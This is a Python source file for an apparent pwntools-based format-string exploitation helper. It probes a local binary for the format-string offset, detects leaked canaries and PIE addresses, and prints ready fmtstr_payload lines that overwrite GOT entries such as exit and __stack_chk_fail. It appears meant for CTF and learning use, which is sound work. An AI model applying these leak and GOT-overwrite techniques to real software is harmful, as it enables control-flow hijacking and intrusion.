import click
from pwn import *
import regex

import checkers

# --- print functions in GOT that can likely be used in overwrite ---
def print_got(elf, write, i):

    target_funcs = [
        "exit",
        "__stack_chk_fail",
        "puts",
        "__libc_fini_array",
    ]
    target_funcs = [func for func in target_funcs if func in elf.got]

    click.secho("--- suggestions for overwrite ---", fg="green")

    for func in target_funcs:
        if func == "__stack_chk_fail":
            click.secho(
                f"payload = fmtstr_payload({i}, {{elf.got['{func}']:elf.symbols['{write}']}}) + b'A'*1000 # overwrites {func} to {write} and modifies canary",
                italic=True,
            )
        else:
            click.secho(
                f"payload = fmtstr_payload({i}, {{elf.got['{func}']:elf.symbols['{write}']}}) # overwrites {func} to {write}",
                italic=True,
                )

    click.secho("\n--- full GOT ---", fg="green")
    print(elf.got)

    if not elf.symbols.get(write):
        click.secho(
            f"Warning: elf.symbols[{write}] does not exist. You might want to try another function.",
            fg="yellow",
        )


# --- get route to format string ---
def get_route():
    route = []
    keyword = []
    format_index = -1

    p = process(stdin=PTY, stdout=PTY)

    click.secho("--- binary start ---", fg="cyan")
    combined_output = p.clean().decode()

    # simulate the binary output
    click.echo(combined_output, nl=False)

    # repeat while our parsed format string (eg. S0x0000F) is not in the output
    while (match := regex.search(r"S((?:0x[0-9a-f]+)|(?:\(nil\)))F", combined_output)) is None:
        user_input = input().strip().encode()
        p.sendline(user_input)
        route.append(user_input)

        current_output = p.clean().decode()
        combined_output += current_output

        # simulate the binary output
        click.echo(current_output, nl=False)

        format_index += 1
    else:
        click.secho("\n--- binary end ---", fg="red")

        # get the characters (keywords) surrounding the parsed format string
        match = match.group(0)
        start = regex.search(rf"([\w\W]*){match}", combined_output).group(1)
        end = regex.search(rf"{match}([\w\W]*)", combined_output).group(1)

    keyword.append(start[-10:].encode())
    keyword.append(end[:10].encode())

    p.close()

    return route, format_index, keyword


# --- send payload ---
def send_payload(i, step, p):
    payload = step.replace(b"S%pF", f"%{i}$p".encode())
    # NOTE: these random empty print lines prevent the fuzzer from freezing in some cases. idk why, but if it works it works :p
    print("", end="")
    p.sendline(payload)
    print("", end="")


# --- scan output for potential leaks ---
def identify_leak(
    i, p, keyword, elf, custom
):
    # recv until start of leak
    p.recvuntil(keyword[0])

    if keyword[1] != b"":
        leak = p.recvuntil(keyword[1], drop=True).strip()
    else:
        # end of leak is empty, just receive the rest of the input
        leak = p.clean().strip()

    # process leak
    if checkers.offset_check(leak, i):
        return {
            "type": "offset",
            "index": i
        }
    elif elf.pie and (symbol := checkers.pie_check(leak, elf)) != False:
        return {
            "type": "pie",
            "index": i,
            "symbol": symbol
        }
    elif elf.canary and checkers.canary_check(leak, elf):
        return {
            "type": "canary",
            "index": i
        }
    elif custom and checkers.custom_check(leak, custom):
        return {
            "type": "custom",
            "leak": leak,
            "index": i
        }

    return {
        "type": "unknown"
    }


# --- summarize leaks ---
def summary(progress, offset, canaries, pies, custom_strings):
    with context.local(log_level="info"):
        progress.success("Done!")
    click.secho("\n--- Summary ---", fg="cyan")
    if offset != []:
        click.secho("Offset:")
        click.secho(f"\t%{offset[0]}$p", fg="blue")
    if pies != {}:
        click.secho("Possible PIE leaks:")
        for i in pies:
            click.secho(f"\t{i}: {', '.join([f'%{j}$p' for j in pies[i]])}", fg="cyan")
    if canaries != []:
        click.secho("Possible canaries:")
        for i in canaries:
            click.secho(f"\t%{i}$p", fg="yellow")
    if custom_strings != {}:
        click.secho("Found custom string at:")
        for i in custom_strings:
            click.secho(
                f"\t{i}: {', '.join([f'%{j}$p' for j in custom_strings[i]])}",
                fg="magenta",
            )
